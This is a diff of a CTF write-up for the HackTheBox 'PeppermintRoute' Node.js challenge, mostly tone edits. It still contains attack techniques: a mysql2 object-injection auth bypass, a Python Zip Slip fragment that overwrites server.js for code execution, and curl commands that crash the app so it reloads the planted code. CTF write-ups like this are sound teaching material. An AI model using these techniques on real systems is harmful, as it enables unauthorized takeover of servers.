@@ -10,15 +10,15 @@ images: ["featured.png", "rank.png"]
 
 # PeppermintRoute: Our Journey Through the challenge
 
-Hey there! 👋 Let me walk you through our complete journey solving the PeppermintRoute challenge. This was part of the **HackTheBox University CTF 2025**, an international cybersecurity competition for students where we participated with the **Phreaks 2600** team.
+This writeup covers our complete journey solving the PeppermintRoute challenge. This was part of the **HackTheBox University CTF 2025**, an international cybersecurity competition for students where we participated with the **Phreaks 2600** team.
 
 ![HTB University CTF 2025 Logo](./featured.png)
 
-We finished **35th place** overall - not the best ranking, but hey, we had an amazing time! I was lucky enough to be **MVP of the team** (lol).
+We finished **35th place** overall - not the best ranking, but the experience was invaluable. As a bonus, this challenge contributed to earning the **team MVP** title.
 
 ![Team Ranking](./rank.png)
 
-This medium-difficulty web challenge was really cool for combining multiple vulnerabilities in creative ways. A huge shoutout to **Tibo.wav** who absolutely **clutched** with the final piece - the controlled crash technique that allowed us to restart the server and get our last flag of the CTF! 🎉
+This medium-difficulty web challenge stood out for combining multiple vulnerabilities in creative ways. A huge shoutout to **Tibo.wav** who came through with the final piece - the controlled crash technique that allowed us to restart the server and get our last flag of the CTF!
 
 ## First Impressions
 
@@ -32,9 +32,9 @@ When we first saw PeppermintRoute, we thought: "Okay, a Node.js web app for mana
 
 The app manages holiday deliveries with different user roles (admins, pilots, users) and lets you upload ZIP files for packages. Sounds innocent enough, right?
 
-## Getting My Bearings: Understanding the Target
+## Understanding the Target
 
-Before diving into exploitation, we always like to understand what we're dealing with. Let me show you how we approached the reconnaissance phase.
+Before diving into exploitation, understanding the target is essential. Here's how the reconnaissance phase went.
 
 ### Architecture Discovery
 
@@ -45,10 +45,10 @@ PeppermintRoute/
 ├── server.js              # Main server - this would be key for RCE
 ├── app/
 │   ├── controllers/
-│   │   ├── authController.js    # 🔴 This looked suspicious from the start
+│   │   ├── authController.js    # Suspicious from the start
 │   │   └── fileController.js    # File uploads - always check these
 │   ├── utils/
-│   │   └── zipParser.js         # 🔴 "Custom ZIP parser"? That's a red flag!
+│   │   └── zipParser.js         # "Custom ZIP parser"? Red flag!
 │   ├── routes/                  # Route definitions
 │   ├── views/                   # EJS templates
 │   └── public/                  # Static files
@@ -75,7 +75,7 @@ We knew we needed to find where the flag was stored. In HTB challenges, there ar
 
 ## Finding the First Vulnerability
 
-We always start with the low-hanging fruit in web challenges: authentication. Let me walk you through how we discovered and exploited the auth bypass.
+Starting with the low-hanging fruit in web challenges: authentication. Here's how the auth bypass was discovered and exploited.
 
 ### Starting with the Login Endpoint
 
@@ -84,7 +84,7 @@ The first thing we tried was the obvious: basic SQL injection in the login form.
 **What We Found in `authController.js`**:
 ```javascript
 const login = async (req, res) => {
-    const { username, password } = req.body;  // This destructuring caught my eye
+    const { username, password } = req.body;  // This destructuring is worth noting
 
     if (!username || !password) {
         return res.status(400).json({ error: 'Please enter Username and Password!' });
@@ -98,11 +98,11 @@ const login = async (req, res) => {
 };
 ```
 
-**My Initial Thoughts**: "Prepared statements should prevent SQLi... but what's this destructuring doing? And why no type validation?"
+**Initial observation**: "Prepared statements should prevent SQLi... but what's this destructuring doing? And why no type validation?"
 
 ### The Object Injection Discovery
 
-I remembered a technique we read about in some security research. What if instead of strings, we send **objects** as the username and password?
+A technique from previous security research came to mind. What if instead of strings, **objects** are sent as the username and password?
 
 **Our Experiment**:
 ```json
@@ -123,14 +123,14 @@ if (!username || !password)  // Objects are truthy, so this passes!
 
 **The SQL Magic**: MySQL's `mysql2` library serializes objects into SQL:
 - `{username: 1}` becomes `` `username` = 1 ``
-- The WHERE clause becomes: `WHERE `username` = 1 AND `password` = 1`
+- The WHERE clause becomes: `` WHERE `username` = 1 AND `password` = 1 ``
 - Since we're looking for ANY user, this becomes a tautology!
 
 **Why This Works**: The prepared statement protects against direct SQL injection, but doesn't validate input types. Objects get serialized in unexpected ways.
 
-**Our Reaction**: "Holy crap, that actually worked!"
+And it worked.
 
-**Resources I Referenced**:
+**References**:
 - [Finding an unseen SQL Injection by bypassing escape functions in mysqljs/mysql](https://flatt.tech/research/posts/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql/)
 - MySQL2 library documentation on object serialization
 
@@ -171,9 +171,9 @@ const fullPath = path.resolve(destDir, zipName);
 ```
 
 **Why the Protection Failed**:
-The code only counted directory depth (`parts.length > 4`) but didn't check for `..` sequences. A path like `../../../server.js` has only 1 part after filtering, so it passes the check!
+The code only counted directory depth (`parts.length > 4`) but didn't check for `..` sequences. A path like `../../../server.js` splits into 4 parts (`..`, `..`, `..`, `server.js`), which is not greater than 4, so it passes the check!
 
-**My "Eureka!" Moment**: "We can overwrite the main server.js file! If we replace it with malicious code, we get RCE!"
+**Key realization**: The main `server.js` file can be overwritten! Replacing it with malicious code means RCE.
 
 **Creating the Exploit ZIP**:
 ```python
@@ -197,10 +197,9 @@ with zipfile.ZipFile("exploit.zip", "w") as z:
     z.writestr("../../../server.js", payload)  # Zip Slip attack!
 ```
 
-**Resources That Helped Me**:
+**References**:
 - [Zip Slip Vulnerability - Snyk](https://security.snyk.io/research/zip-slip-vulnerability)
 - [GPUkiller/ZipSlipNodeJS on GitHub](https://github.com/GPUkiller/ZipSlipNodeJS)
-- My own past experiences with similar vulnerabilities
 
 
 ## Putting It All Together: The Complete Exploit Chain
@@ -300,7 +299,7 @@ CRASH_ID=$(curl -s -b user_cookies.txt "http://target.htb/api/user/package/$RECI
 curl -b user_cookies.txt "http://target.htb/user/packages/$RECIPIENT/download?fileId=$CRASH_ID"
 ```
 
-**Huge thanks to Tibo.wav** who discovered this brilliant controlled crash technique that made the entire exploit work! 🎉
+**Huge thanks to Tibo.wav** who discovered this controlled crash technique that made the entire exploit work!
 
 #### Step 9: Profit - Get the Flag
 ```bash
@@ -320,14 +319,14 @@ The beauty of this approach is that it uses the application's own error handling
 
 ## The Technical Deep Dive: Understanding Why Everything Works
 
-Now let me explain the technical details that make this exploit possible. The controlled crash technique that Tibo.wav discovered was particularly clever.
+Here are the technical details that make this exploit possible. The controlled crash technique that Tibo.wav discovered was particularly clever.
 
 ### The Node.js Module Caching Problem
 
 **Why just overwriting server.js doesn't work**:
 Node.js caches required modules. When you do `require('./server.js')`, it loads the file once and keeps it in memory. Even if you change the file on disk, the running server still uses the cached version.
 
-**My attempts to bypass this**:
+**Attempts to bypass this**:
 1. Overwrite `server.js` → Cached version still runs
 2. Try `require.cache` manipulation → Didn't work
 3. Look for hot-reload mechanisms → None found
@@ -380,7 +379,7 @@ When Node.js crashes, supervisord automatically restarts it, loading the new `se
 ```javascript
 // Input: { username: {username: 1}, password: {password: 1} }
 // MySQL sees: ['object', 'object']
-// SQL becomes: WHERE username = `username` = 1 AND password = `password` = 1
+// SQL becomes: WHERE username = 'username' = 1 AND password = 'password' = 1
 // Result: Always true condition
 ```
 
@@ -414,7 +413,7 @@ if (parts.length > 4) continue;  // Only blocks deep paths, not traversal
 
 ## Final Thoughts
 
-If you're reading this and trying to solve PeppermintRoute, here's my advice:
+For anyone tackling similar challenges, here are some takeaways:
 
 1. **Don't give up on "impossible" paths** - the crash method seemed crazy at first
 2. **Understand the technology stack** - Node.js caching was the key insight
@@ -423,8 +422,6 @@ If you're reading this and trying to solve PeppermintRoute, here's my advice:
 
 Security research is as much about creativity and persistence as it is about technical knowledge.
 
-**Happy Hacking!** 🎄🔒
-
 ---
 
-*See You soon for another writeup - Elliot*
+*See you soon for another writeup - Elliot*
